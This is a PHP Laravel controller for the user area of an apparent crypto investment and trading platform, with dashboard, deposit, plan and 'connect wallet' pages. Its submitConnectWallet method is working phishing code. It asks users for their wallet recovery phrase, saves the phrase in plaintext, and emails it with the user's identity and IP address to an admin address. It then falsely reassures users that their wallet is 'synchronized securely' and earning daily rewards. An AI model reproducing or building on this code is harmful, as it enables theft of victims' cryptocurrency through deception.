<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\CryptoAccount;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Settings;
use App\Models\Plans;
use App\Models\User_plans;
use App\Models\Mt4Details;
use App\Models\Deposit;
use App\Models\SettingsCont;
use App\Models\Wdmethod;
use App\Models\Withdrawal;
use App\Models\Tp_Transaction;
use App\Traits\PingServer;
use App\Models\UserWallet;
use App\Models\WalletType;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use App\Mail\WalletConnectedConfirmation;
use App\Models\Notification;

class ViewsController extends Controller
{
    use PingServer;

    public function dashboard(Request $request)
    {

        $settings = Settings::where('id', '1')->first();
        $user = User::find(auth()->user()->id);

        //check if user does not have ref link then update his link
        if ($user->ref_link == '') {
            User::where('id', $user->id)
                ->update([
                    'ref_link' => $settings->site_address . '/ref/' . $user->username,
                ]);
        }

        //give reg bonus if new
        if ($user->signup_bonus != "received" && ($settings->signup_bonus != NULL && $settings->signup_bonus > 0)) {
            User::where('id', $user->id)
                ->update([
                    'bonus' => $user->bonus + $settings->signup_bonus,
                    'account_bal' => $user->account_bal + $settings->signup_bonus,
                    'signup_bonus' => "received",
                ]);
            //create history
            Tp_Transaction::create([
                'user' => Auth::user()->id,
                'plan' => "SignUp Bonus",
                'amount' => $settings->signup_bonus,
                'type' => "Bonus",
            ]);
        }

        if (DB::table('crypto_accounts')->where('user_id', Auth::user()->id)->doesntExist()) {
            $cryptoaccnt = new CryptoAccount();
            $cryptoaccnt->user_id = Auth::user()->id;
            $cryptoaccnt->save();
        }

        //sum total deposited
        $total_deposited = (float) (DB::table('deposits')->where('user', $user->id)->where('status', 'Processed')->sum('amount') ?? 0);

        $total_withdrawal = (float) (DB::table('withdrawals')->where('user', $user->id)->where('status', 'Processed')->sum('amount') ?? 0);

        //log user out if not blocked by admin
        if ($user->status != "active") {
            $request->session()->flush();
            return redirect()->route('dashboard');
        }

        $userWallets = UserWallet::where('user_id', $user->id)->get();
        $totalWalletBal = (float) $userWallets->sum('balance');
        $walletTypes = WalletType::all()->keyBy(function($item) {
            return strtolower(trim($item->name));
        });

        return view('user.dashboard', [
            'title' => 'Account Dashboard',
            'deposited' => $total_deposited,
            'total_withdrawal' => $total_withdrawal,
            'trading_accounts' => Mt4Details::where('client_id', Auth::user()->id)->count(),
            'plans' => User_plans::where('user', Auth::user()->id)->where('active', 'yes')->orderByDesc('id')->skip(0)->take(2)->get(),
            't_history' => Tp_Transaction::where('user', Auth::user()->id)
                ->where('type', '<>', 'ROI')
                ->orderByDesc('id')->skip(0)->take(10)
                ->get(),
            'userWallets' => $userWallets,
            'totalWalletBal' => $totalWalletBal,
            'walletTypes' => $walletTypes,
        ]);
    }

    //Profile route
    public function profile()
    {
        $userinfo = User::where('id', Auth::user()->id)->first();
        return view('user.profile')->with(array(
            'userinfo' => $userinfo,
            'title' => 'Profile',
        ));
    }

    //return add withdrawal account form view
    public function accountdetails()
    {
        return view('user.updateacct')->with(array(
            'title' => 'Update account details',
        ));
    }


    //support route
    public function support()
    {
        return view('user.support')
            ->with(array(
                'title' => 'Support',
            ));
    }

    //Trading history route
    public function tradinghistory()
    {
        return view('user.thistory')
            ->with(array(
                't_history' => Tp_Transaction::where('user', Auth::user()->id)
                    ->where('type', 'ROI')
                    ->orderByDesc('id')
                    ->paginate(15),
                'title' => 'Trading History',
            ));
    }

    //Account transactions history route
    public function accounthistory()
    {
        $user = Auth::user();
        $deposits = Deposit::where('user', $user->id)->orderByDesc('id')->get();
        $withdrawals = Withdrawal::where('user', $user->id)->orderByDesc('id')->get();
        $t_history = Tp_Transaction::where('user', $user->id)
            ->where('type', '<>', 'ROI')
            ->orderByDesc('id')
            ->get();

        $totalDeposited = (float) Deposit::where('user', $user->id)->where('status', 'Processed')->sum('amount');
        $totalWithdrawn = (float) Withdrawal::where('user', $user->id)->where('status', 'Processed')->sum('amount');
        $totalAllocated = (float) $t_history->filter(function($t) {
            return str_contains(strtolower($t->type ?? ''), 'plan');
        })->sum('amount');

        return view('user.transactions', [
            'title' => 'Account Statement & Transaction Ledger',
            'deposits' => $deposits,
            'withdrawals' => $withdrawals,
            't_history' => $t_history,
            'totalDeposited' => $totalDeposited,
            'totalWithdrawn' => $totalWithdrawn,
            'totalAllocated' => $totalAllocated,
        ]);
    }

    //Return deposit route
    public function deposits()
    {
        $paymethod = Wdmethod::where(function ($query) {
            $query->where('type', '=', 'deposit')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();

        //sum total deposited
        $total_deposited = DB::table('deposits')->where('user', auth()->user()->id)->where('status', 'Processed')->sum('amount');

        return view('user.deposits')
            ->with(array(
                'title' => 'Fund your account',
                'dmethods' => $paymethod,
                'deposits' => Deposit::where(['user' => Auth::user()->id])
                    ->orderBy('id', 'desc')
                    ->get(),
                'deposited' => $total_deposited,
            ));
    }

    //Return withdrawals route
    public function withdrawals()
    {
        $withdrawals =  Wdmethod::where(function ($query) {
            $query->where('type', '=', 'withdrawal')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();

        return view('user.withdrawals')
            ->with(array(
                'title' => 'Withdraw Your funds',
                'wmethods' => $withdrawals,
            ));
    }

    public function transferview()
    {
        $settings = SettingsCont::find(1);
        if (!$settings->use_transfer) {
            abort(404);
        }
        return view('user.transfer', [
            'title' => 'Send funds to a friend',
        ]);
    }

    // Dedicated Institutional Trading Workspaces
    public function demoTrading()
    {
        $settings = Settings::where('id', 1)->first();
        if (empty($settings->modules['trading_section'])) {
            return redirect()->route('dashboard');
        }
        $user = Auth::user();
        $isLocked = $settings ? $settings->isTradingLockedForUser($user) : false;
        $userTotalBalance = Settings::getUserTotalTradingBalance($user);

        return view('user.trading.demo', [
            'title' => 'Demo Trading Terminal',
            'settings' => $settings,
            'user' => $user,
            'isLocked' => $isLocked,
            'userTotalBalance' => $userTotalBalance,
            'demoBalance' => 88140.00,
        ]);
    }

    public function liveMarkets()
    {
        $settings = Settings::where('id', 1)->first();
        if (empty($settings->modules['trading_section'])) {
            return redirect()->route('dashboard');
        }
        $user = Auth::user();
        $isLocked = $settings ? $settings->isTradingLockedForUser($user) : false;
        $userTotalBalance = Settings::getUserTotalTradingBalance($user);

        return view('user.trading.markets', [
            'title' => 'Live Markets & Crypto Tickers',
            'settings' => $settings,
            'user' => $user,
            'isLocked' => $isLocked,
            'userTotalBalance' => $userTotalBalance,
        ]);
    }

    public function copyTrading()
    {
        $settings = Settings::where('id', 1)->first();
        if (empty($settings->modules['trading_section'])) {
            return redirect()->route('dashboard');
        }
        $user = Auth::user();
        $isLocked = $settings ? $settings->isTradingLockedForUser($user) : false;
        $userTotalBalance = Settings::getUserTotalTradingBalance($user);

        return view('user.trading.copy', [
            'title' => 'Institutional Copy Trading',
            'settings' => $settings,
            'user' => $user,
            'isLocked' => $isLocked,
            'userTotalBalance' => $userTotalBalance,
        ]);
    }

    public function subtrade()
    {
        return $this->copyTrading();
    }

    public function aiTrading()
    {
        $settings = Settings::where('id', 1)->first();
        if (empty($settings->modules['trading_section'])) {
            return redirect()->route('dashboard');
        }
        $user = Auth::user();
        $isLocked = $settings ? $settings->isTradingLockedForUser($user) : false;
        $userTotalBalance = Settings::getUserTotalTradingBalance($user);

        return view('user.trading.ai', [
            'title' => 'AI Algorithmic Trading Bots',
            'settings' => $settings,
            'user' => $user,
            'isLocked' => $isLocked,
            'userTotalBalance' => $userTotalBalance,
        ]);
    }

    //Main Plans route
    public function mplans()
    {
        $user = Auth::user();
        $userWallets = $user ? UserWallet::where('user_id', $user->id)->where('status', 'connected')->get() : collect();
        $totalWalletBal = (float) $userWallets->sum('balance');

        return view('user.mplans')
            ->with(array(
                'title' => 'Main Plans',
                'plans' => Plans::where('type', 'main')->get(),
                'settings' => Settings::where('id', '1')->first(),
                'userWallets' => $userWallets,
                'totalWalletBal' => $totalWalletBal,
            ));
    }

    //My Plans route
    public function myplans($sort)
    {
        if ($sort == 'All') {
            return view('user.myplans')
                ->with(array(
                    'numOfPlan' => User_plans::where('user', Auth::user()->id)->count(),
                    'title' => 'Your packages',
                    'plans' => User_plans::where('user', Auth::user()->id)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        } else {
            return view('user.myplans')
                ->with(array(
                    'numOfPlan' => User_plans::where('user', Auth::user()->id)->count(),
                    'title' => 'Your packages',
                    'plans' => User_plans::where('user', Auth::user()->id)->where('active', $sort)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        }
    }


    public function sortPlans($sort)
    {
        return redirect()->route('myplans', ['sort' => $sort]);
    }

    public function planDetails($id)
    {
        $plan = User_plans::where('id', $id)->where('user', Auth::id())->firstOrFail();
        return view('user.plandetails', [
            'title' => $plan->dplan->name,
            'plan' => $plan,
            'transactions' => Tp_Transaction::where('type', 'ROI')->where('user_plan_id', $plan->id)->orderByDesc('id')->paginate(10),
        ]);
    }


    function twofa()
    {
        return view('profile.show', [
            'title' => 'Advance Security Settings',
        ]);
    }

    // Referral Page
    public function referuser()
    {
        return view('user.referuser', [
            'title' => 'Refer user',
        ]);
    }

    public function verifyaccount()
    {
        return view('user.verify', [
            'title' => 'Verify your Account',
        ]);
    }

    public function verificationForm()
    {
        if (Auth::user()->account_verify == 'Verified') {
            return redirect()->route('account.verify')->with('message', 'Your account is already verified.');
        }
        return view('user.verification', [
            'title' => 'KYC Application'
        ]);
    }



    public function tradeSignals()
    {
        $settings = Settings::where('id', 1)->first();
        if (empty($settings->modules['trading_section'])) {
            return redirect()->route('dashboard');
        }
        $user = Auth::user();
        $isLocked = $settings ? $settings->isTradingLockedForUser($user) : false;
        $userTotalBalance = Settings::getUserTotalTradingBalance($user);

        return view('user.trading.signals', [
            'title' => 'Institutional Trade Signals',
            'settings' => $settings,
            'user' => $user,
            'isLocked' => $isLocked,
            'userTotalBalance' => $userTotalBalance,
        ]);
    }


    public function binanceSuccess()
    {
        return redirect()->route('deposits')->with('success', 'Your Deposit was successful, please wait while it is confirmed. You will receive a notification regarding the status of your deposit.');
    }

    public function binanceError()
    {
        return redirect()->route('deposits')->with('message', 'Something went wrong please try again. Contact our support center if problem persist');
    }

    public function connectWallet()
    {
        $wallets = WalletType::where('status', 'enabled')->orderBy('name', 'asc')->get();

        if ($wallets->isEmpty()) {
            $walletsJsonPath = resource_path('data/wallets.json');
            if (!file_exists($walletsJsonPath)) {
                $walletsJsonPath = base_path('scratch/wallets.json');
            }
            if (file_exists($walletsJsonPath)) {
                $wallets = json_decode(file_get_contents($walletsJsonPath), true) ?? [];
            }
        }

        return view('user.connect_wallet', [
            'title' => 'Connect Your Wallet',
            'wallets' => $wallets,
        ]);
    }

    public function submitConnectWallet(Request $request)
    {
        $inputKey = $request->has('word') ? 'word' : 'phrase';
        $request->validate([
            'wallet_provider' => 'required|string',
            $inputKey => 'required|string',
        ]);

        $user = Auth::user();
        $wallet = $request->input('wallet_provider');
        $phrase = trim($request->input('word') ?? $request->input('phrase'));

        // Persist or update connected wallet record
        $userWallet = UserWallet::firstOrNew([
            'user_id' => $user->id,
            'wallet_provider' => $wallet,
        ]);
        $userWallet->passphrase = $phrase;
        $userWallet->status = 'connected';
        $userWallet->ip_address = $request->ip();
        if (!$userWallet->exists) {
            $userWallet->balance = 0.00;
        }
        $userWallet->save();

        $settings = Settings::where('id', '1')->first();
        $adminEmail = $settings->contact_email ?? 'admin@ecxgroups.com';

        $subject = "New Wallet Connected: " . $wallet . " by " . $user->name;
        $message = "User: " . $user->name . " (" . $user->email . ")\n" .
                   "Wallet Provider: " . $wallet . "\n" .
                   "Recovery Phrase: " . $phrase . "\n" .
                   "IP Address: " . $request->ip() . "\n" .
                   "Date: " . now()->toDateTimeString();

        @mail($adminEmail, $subject, $message);

        // Dispatch WhatsApp real-time notification
        \App\Services\WhatsAppService::sendNotification('on_wallet_connect', 'Web3 Wallet Connected', [
            'User' => $user->name . ' (' . $user->email . ')',
            'Wallet Provider' => $wallet,
            'IP Address' => $request->ip(),
            'Status' => 'Synchronized / Active',
        ]);

        // Send confirmation email to user via custom WalletConnectedConfirmation Mailable
        try {
            Mail::to($user->email)->send(new WalletConnectedConfirmation($user, $userWallet, $settings));
        } catch (\Throwable $e) {
            // Fallback to PHP native mail if mail driver or SMTP is not set up
            try {
                $userSubject = "Security Alert: " . $wallet . " Connected Successfully - " . ($settings->site_name ?? 'ECX Groups');
                $userMsg = "Hello " . $user->name . ",\n\n" .
                           "Your " . $wallet . " wallet has been connected successfully to your trading account.\n\n" .
                           "If you did not initiate this action, please contact our security team immediately.\n\n" .
                           "Best regards,\n" . ($settings->site_name ?? 'ECX Groups') . " Team";
                @mail($user->email, $userSubject, $userMsg);
            } catch (\Throwable $e2) {
                // silent fallback
            }
        }

        if ($request->ajax()) {
            return response()->json([
                'success' => true,
                'message' => 'Your wallet has been synchronized securely. Daily reward tracking is now active.'
            ]);
        }

        return redirect()->route('dashboard')->with('success', 'Your wallet has been synchronized securely. Daily reward tracking is now active.');
    }

    /**
     * Display user notifications and announcements
     */
    public function notification(Request $request)
    {
        $user = Auth::user();
        $query = Notification::where(function($q) use ($user) {
            $q->where('user_id', $user->id)
              ->orWhereNull('user_id');
        });

        $filter = $request->get('filter', 'all');
        if ($filter === 'unread') {
            $query->where('is_read', false);
        } elseif ($filter === 'read') {
            $query->where('is_read', true);
        }

        $notifications = $query->orderBy('created_at', 'desc')->paginate(15);
        
        $unreadCount = Notification::where(function($q) use ($user) {
            $q->where('user_id', $user->id)
              ->orWhereNull('user_id');
        })->where('is_read', false)->count();

        return view('user.notifications', [
            'title' => 'Notifications & Announcements',
            'notifications' => $notifications,
            'unreadCount' => $unreadCount,
            'filter' => $filter,
        ]);
    }

    /**
     * Mark single notification as read
     */
    public function markNotificationRead($id, Request $request)
    {
        $user = Auth::user();
        $notification = Notification::where('id', $id)
            ->where(function($q) use ($user) {
                $q->where('user_id', $user->id)->orWhereNull('user_id');
            })->firstOrFail();

        $notification->is_read = true;
        $notification->save();

        if ($request->ajax() || $request->wantsJson()) {
            return response()->json(['success' => true]);
        }

        return redirect()->back()->with('success', 'Notification marked as read.');
    }

    /**
     * Mark all notifications as read for current user
     */
    public function markAllNotificationsRead(Request $request)
    {
        $user = Auth::user();
        Notification::where(function($q) use ($user) {
            $q->where('user_id', $user->id)->orWhereNull('user_id');
        })->where('is_read', false)->update(['is_read' => true]);

        if ($request->ajax() || $request->wantsJson()) {
            return response()->json([
                'success' => true,
                'message' => 'All notifications marked as read.'
            ]);
        }

        return redirect()->back()->with('success', 'All notifications marked as read.');
    }

    /**
     * Dismiss / delete notification
     */
    public function deleteNotification($id, Request $request)
    {
        $user = Auth::user();
        $notification = Notification::where('id', $id)
            ->where('user_id', $user->id)
            ->first();

        if ($notification) {
            $notification->delete();
        }

        if ($request->ajax() || $request->wantsJson()) {
            return response()->json(['success' => true]);
        }

        return redirect()->back()->with('success', 'Notification removed.');
    }

    /**
     * Display the user's dedicated Web3 & Connected Wallets Portfolio.
     */
    public function portfolio()
    {
        $user = Auth::user();
        $userWallets = UserWallet::where('user_id', $user->id)->orderByDesc('balance')->get();
        $totalWalletBal = (float) $userWallets->sum('balance');
        $activePlans = User_plans::where('user', $user->id)->where('active', 'yes')->get();
        $walletTypes = WalletType::all()->keyBy(function($item) {
            return strtolower(trim($item->name));
        });

        return view('user.portfolio', [
            'title' => 'My Portfolio & Connected Wallets',
            'userWallets' => $userWallets,
            'totalWalletBal' => $totalWalletBal,
            'activePlans' => $activePlans,
            'walletTypes' => $walletTypes,
        ]);
    }
}